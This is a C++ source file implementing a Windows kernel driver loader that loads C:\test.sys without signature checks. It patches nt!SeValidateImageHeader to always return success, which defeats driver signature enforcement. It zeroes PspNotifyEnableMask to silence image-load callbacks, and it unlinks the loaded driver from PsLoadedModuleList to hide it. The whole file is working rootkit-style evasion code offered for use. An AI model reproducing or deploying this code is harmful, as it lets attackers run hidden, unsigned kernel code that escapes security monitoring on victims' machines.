#include "loader.hpp"
#include "hooks.hpp"
#include "utils.hpp"

static UNICODE_STRING ImagePath = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\test.sys");

static tMmLoadSystemImage MmLoadSystemImage;
static UINT32* PspNotifyEnableMask;
static PDBGKD_GET_VERSION64 KdVersionBlock;
static void* SeValidateImageHeader;

bool Loader::LoadDriver(PLDR_DATA_TABLE_ENTRY Ntoskrnl) {
	// Searching for nt!MmLoadSystemImage
	MmLoadSystemImage = (tMmLoadSystemImage)Utils::SignatureScan(Ntoskrnl->DllBase,
		"\x48\x83\xEC\x48\x41\xF7\xC1", "xxxxxxx", 7, Ntoskrnl->SizeOfImage);
	if (MmLoadSystemImage == nullptr)
		return false;

	// Searching for nt!KdVersionBlock
	KdVersionBlock = (PDBGKD_GET_VERSION64)Utils::SignatureScan(Ntoskrnl->DllBase,
		"\x00\x00\x00\x00\x06\x02\x46\x00\x64\x86", "xxxxxxxxxx", 10, Ntoskrnl->SizeOfImage);
	if (KdVersionBlock == nullptr)
		return false;

	// Searching for nt!PspNotifyEnableMask
	PspNotifyEnableMask = (UINT32*)Utils::SignatureScan(Ntoskrnl->DllBase,
		"\xF0\x0F\xBA\x2D\x00\x00\x00\x00\x00\x33\xDB", "xxxx?????xx", 11, Ntoskrnl->SizeOfImage);
	if (PspNotifyEnableMask == nullptr)
		return false;
	PspNotifyEnableMask = (UINT32*)((UINT64)PspNotifyEnableMask + *(INT32*)((UINT64)PspNotifyEnableMask + 4) + 9);

	// Searching for nt!SeValidateImageHeader
	SeValidateImageHeader = Utils::SignatureScan(Ntoskrnl->DllBase,
		"\x48\x81\xEC\x00\x00\x00\x00\x33\xF6\x48\x8B\xDA", "xxx????xxxxx", 12, Ntoskrnl->SizeOfImage);
	if (SeValidateImageHeader == nullptr)
		return false;
	SeValidateImageHeader = (void*)((UINT64)SeValidateImageHeader - 12);

	// Patching nt!SeValidateImageHeader
	Utils::MemCpy(SeValidateImageHeader, (void*)"\x48\x31\xC0\xC3", 4); // xor rax, rax; ret

	// Disabling callbacks
	UINT32 PspNotifyEnableMaskOld = *PspNotifyEnableMask;
	*PspNotifyEnableMask = 0;

	// Loading driver into system driver space
	void* ModuleObject, *ImageBaseAddress;
	NTSTATUS Status = MmLoadSystemImage(&ImagePath, 0, 0, 0, &ModuleObject, &ImageBaseAddress);
	if (Status == STATUS_SUCCESS) {
		PLDR_DATA_TABLE_ENTRY Module = (PLDR_DATA_TABLE_ENTRY)KdVersionBlock->PsLoadedModuleList->Flink;

		PLDR_DATA_TABLE_ENTRY LoadedDriver = nullptr;
		do {
			if (Module->DllBase == ImageBaseAddress) {
				LoadedDriver = Module;
				break;
			}
			Module = (PLDR_DATA_TABLE_ENTRY)Module->InLoadOrderLinks.Flink;
		} while (Module != (PLDR_DATA_TABLE_ENTRY)KdVersionBlock->PsLoadedModuleList->Flink);

		if (LoadedDriver) {
			// Removing driver from PsLoadedModuleList
			PLDR_DATA_TABLE_ENTRY PrevDriver = (PLDR_DATA_TABLE_ENTRY)LoadedDriver->InLoadOrderLinks.Blink;
			PLDR_DATA_TABLE_ENTRY NextDriver = (PLDR_DATA_TABLE_ENTRY)LoadedDriver->InLoadOrderLinks.Flink;

			PrevDriver->InLoadOrderLinks.Flink = (LIST_ENTRY*)NextDriver;
			NextDriver->InLoadOrderLinks.Blink = (LIST_ENTRY*)PrevDriver;

			// Invoking DriverEntry
			PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)LoadedDriver->DllBase;
			PIMAGE_NT_HEADERS64 Nt = (PIMAGE_NT_HEADERS64)((UINT64)Dos + Dos->e_lfanew);

			tDriverEntry DriverEntry = (tDriverEntry)((UINT64)LoadedDriver->DllBase + Nt->OptionalHeader.AddressOfEntryPoint);
			Status = DriverEntry(nullptr, nullptr);
		}
	}

	// Enabling callbacks
	*PspNotifyEnableMask = PspNotifyEnableMaskOld;

	// Restoring original bytes
	Utils::MemCpy(SeValidateImageHeader, (void*)"\x48\x8B\xC4\x48", 4);

	return Status == STATUS_SUCCESS;
}